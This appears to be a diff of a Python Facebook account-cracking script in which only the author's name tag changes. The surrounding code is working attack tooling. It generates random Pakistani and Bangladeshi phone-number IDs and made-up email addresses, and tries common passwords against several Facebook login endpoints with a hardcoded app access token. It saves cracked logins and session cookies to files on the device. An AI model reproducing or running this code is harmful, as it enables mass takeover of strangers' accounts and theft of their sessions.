@@ -163,11 +163,11 @@ logo=("""\x1b[1;97m
 \_______)|/     \||/     \|\_______/(_______/                                      
                                                    
      ┌───────────────────────────────────────┐
-     │ [💸] CODED BY : MOHID SAHIL           │
-     │ [💸] GITHUB   : MOHID SAHIL                │
-     │ [💸] WHATSAPP : MOHID SAHIL        │
+     │ [💸] CODED BY : SAHIL           │
+     │ [💸] GITHUB   : SAHIL                │
+     │ [💸] WHATSAPP : SAHIL        │
      │ [💸] VERSION  : A.3                   │
-     │ [💸] HACKED   : \033[1;32mMOHID SAHIL \033[1;37m              │
+     │ [💸] HACKED   : \033[1;32mSAHIL \033[1;37m              │
      └───────────────────────────────────────┘""")
 def linex():
 	print(50*'_')
@@ -323,7 +323,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as MOHID SAHIL:	
+		with tred(max_workers=30) as SAHIL:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -349,17 +349,17 @@ def pak():
 				elif pcs in ['8','08']:
 					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
 				if mthd in ['1','01']:
-					MOHID SAHIL.submit(MOHID SAHIL1,ids,passlist)
+					SAHIL.submit(SAHIL1,ids,passlist)
 				if mthd in ['2','02']:
-					MOHID SAHIL.submit(MOHID SAHIL2,ids,passlist)
+					SAHIL.submit(SAHIL2,ids,passlist)
 				if mthd in ['3','03']:
-					MOHID SAHIL.submit(MOHID SAHIL3,ids,passlist)
+					SAHIL.submit(SAHIL3,ids,passlist)
 				if mthd in ['4','04']:
-					MOHID SAHIL.submit(MOHID SAHIL4,ids,passlist)
+					SAHIL.submit(SAHIL4,ids,passlist)
 				if mthd in ['5','05']:
-					MOHID SAHIL.submit(MOHID SAHIL5,ids,passlist)
+					SAHIL.submit(SAHIL5,ids,passlist)
 				if mthd in ['6','06']:
-					MOHID SAHIL.submit(MOHID SAHIL6,ids,passlist)
+					SAHIL.submit(SAHIL6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
@@ -387,7 +387,7 @@ def BD():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(8))
 			user.append(nmp)
-		with tred(max_workers=30) as MOHID SAHIL:	
+		with tred(max_workers=30) as SAHIL:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -397,7 +397,7 @@ def BD():
 			for psx in user:
 				ids = '+88'+code+psx
 				passlist = [uid[3:11],uid[3:11],uid[3:10],uid[6:14],uid[8:14],'bangla','bangladesh','Bangladesh','i love you','@@@###','@#@#@#','###@@@','free fire','fuck you']
-				MOHID SAHIL.submit(MOHID SAHIL3,ids,passlist)
+				SAHIL.submit(SAHIL3,ids,passlist)
 def gmail():
 		os.system('rm -rf .re.txt')
 		clear()
@@ -437,7 +437,7 @@ def gmail():
 				mail = ''.join(random.choice(string.digits) for _ in range(4))
 				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as MOHID SAHIL:
+		with tred(max_workers=30) as SAHIL:
 			total = str(len(fo))
 			clear()
 			print(' Total ids : \033[1;32m'+total+f' ')
@@ -461,17 +461,17 @@ def gmail():
 				else:
 					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
 				if mthd in ['1','01']:
-					MOHID SAHIL.submit(MOHID SAHIL1,ids,passlist)
+					SAHIL.submit(SAHIL1,ids,passlist)
 				if mthd in ['2','02']:
-					MOHID SAHIL.submit(MOHID SAHIL2,ids,passlist)
+					SAHIL.submit(SAHIL2,ids,passlist)
 				if mthd in ['3','03']:
-					MOHID SAHIL.submit(MOHID SAHIL3,ids,passlist)
+					SAHIL.submit(SAHIL3,ids,passlist)
 				if mthd in ['4','04']:
-					MOHID SAHIL.submit(MOHID SAHIL4,ids,passlist)
+					SAHIL.submit(SAHIL4,ids,passlist)
 				if mthd in ['5','05']:
-					MOHID SAHIL.submit(MOHID SAHIL5,ids,passlist)
+					SAHIL.submit(SAHIL5,ids,passlist)
 				if mthd in ['6','06']:
-					MOHID SAHIL.submit(MOHID SAHIL6,ids,passlist)
+					SAHIL.submit(SAHIL6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
@@ -484,7 +484,7 @@ def gmail():
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [SAHIL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
@@ -549,18 +549,18 @@ def api1(ids,names,passlist):
 				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 				q = json.loads(po)
 				if 'session_key' in q:
-					print('\r\r\033[1;32m [MOHID SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/MOHID SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
+					print('\r\r\033[1;32m [SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
-						open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+						open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
 						break
 				else:
 					continue
@@ -574,7 +574,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [SAHIL-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -622,26 +622,26 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [MOHID SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/MOHID SAHIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/MOHID SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/SAHIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[MOHID SAHIL-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[SAHIL-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -653,7 +653,7 @@ def api2(ids,names,passlist):
 def api3(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [SAHIL-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -721,26 +721,26 @@ def api3(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [MOHID SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/MOHID SAHIL-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/MOHID SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/SAHIL-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[MOHID SAHIL-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[SAHIL-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -753,7 +753,7 @@ def api3(ids,names,passlist):
 def api4(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [SAHIL-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -822,23 +822,23 @@ def api4(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [MOHID SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/MOHID SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[MOHID SAHIL-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[SAHIL-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [MOHID SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;206m [SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -850,7 +850,7 @@ def api4(ids,names,passlist):
 def api5(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [SAHIL-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -938,26 +938,26 @@ def api5(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [MOHID SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SAHIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/MOHID SAHIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/MOHID SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/SAHIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/SAHIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[MOHID SAHIL-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[SAHIL-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/MOHID SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/SAHIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -967,7 +967,7 @@ def api5(ids,names,passlist):
                 pass
 def api6(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [SAHIL-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -984,18 +984,18 @@ def api6(ids,names,passlist):
 			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			MOHID SAHIL=session.cookies.get_dict().keys()
-			if "c_user" in MOHID SAHIL:
+			SAHIL=session.cookies.get_dict().keys()
+			if "c_user" in SAHIL:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [MOHID SAHIL-OK] %s | %s'%(ids,pas))
-				open('/sdcard/MOHID SAHIL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [SAHIL-OK] %s | %s'%(ids,pas))
+				open('/sdcard/SAHIL-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in MOHID SAHIL:
+			elif 'checkpoint' in SAHIL:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/MOHID SAHIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SAHIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1009,7 +1009,7 @@ def api6(ids,names,passlist):
 #d.fb
 def api7(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [SAHIL-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1026,18 +1026,18 @@ def api7(ids,names,passlist):
 			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			MOHID SAHIL=session.cookies.get_dict().keys()
-			if "c_user" in MOHID SAHIL:
+			SAHIL=session.cookies.get_dict().keys()
+			if "c_user" in SAHIL:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [MOHID SAHIL-OK] %s | %s'%(ids,pas))
-				open('/sdcard/MOHID SAHIL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [SAHIL-OK] %s | %s'%(ids,pas))
+				open('/sdcard/SAHIL-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in MOHID SAHIL:
+			elif 'checkpoint' in SAHIL:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/MOHID SAHIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SAHIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1050,7 +1050,7 @@ def api7(ids,names,passlist):
 #method7
 def api8(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [SAHIL-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1067,18 +1067,18 @@ def api8(ids,names,passlist):
 			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			MOHID SAHIL=session.cookies.get_dict().keys()
-			if "c_user" in MOHID SAHIL:
+			SAHIL=session.cookies.get_dict().keys()
+			if "c_user" in SAHIL:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [MOHID SAHIL-OK] %s | %s'%(ids,pas))
-				open('/sdcard/MOHID SAHIL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [SAHIL-OK] %s | %s'%(ids,pas))
+				open('/sdcard/SAHIL-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in MOHID SAHIL:
+			elif 'checkpoint' in SAHIL:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/MOHID SAHIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/SAHIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1089,10 +1089,10 @@ def api8(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 #method1rnd
-def MOHID SAHIL1(ids,passlist):
+def SAHIL1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [SAHIL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1176,8 +1176,8 @@ def MOHID SAHIL1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [MOHID SAHIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/MOHID SAHIL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [SAHIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SAHIL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1187,8 +1187,8 @@ def MOHID SAHIL1(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/MOHID SAHIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [SAHIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SAHIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1196,7 +1196,7 @@ def MOHID SAHIL1(ids,passlist):
         except Exception as e:
                 pass
 
-def MOHID SAHIL2(ids,passlist):
+def SAHIL2(ids,passlist):
 	global loop
 	global oks
 	try:
@@ -1258,12 +1258,12 @@ def MOHID SAHIL2(ids,passlist):
 			if 'session_key' in q:
 				udx = str(q['uid'])
 				print('\r\r\033[1;32m [Mr.SPY-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/MOHID SAHIL-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				open('/sdcard/SAHIL-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
 				print('\r\r\x1b[38;5;205m [Mr.SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/MOHID SAHIL-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
+				open('/sdcard/SAHIL-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -1275,10 +1275,10 @@ def MOHID SAHIL2(ids,passlist):
 		print(e)
 #new method
                 
-def MOHID SAHIL3(ids,passlist):
+def SAHIL3(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [SAHIL-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1351,11 +1351,11 @@ def MOHID SAHIL3(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [MOHID SAHIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SAHIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        #open('/sdcard/MOHID SAHIL-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/MOHID SAHIL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        #open('/sdcard/SAHIL-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/SAHIL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1365,8 +1365,8 @@ def MOHID SAHIL3(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/MOHID SAHIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [SAHIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SAHIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1374,10 +1374,10 @@ def MOHID SAHIL3(ids,passlist):
         except Exception as e:
                 pass
 #method4
-def MOHID SAHIL4(ids,passlist):
+def SAHIL4(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [MOHID SAHIL-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [SAHIL-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1446,11 +1446,11 @@ def MOHID SAHIL4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [MOHID SAHIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SAHIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/MOHID SAHIL-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/MOHID SAHIL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/SAHIL-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/SAHIL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1460,8 +1460,8 @@ def MOHID SAHIL4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [MOHID SAHIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
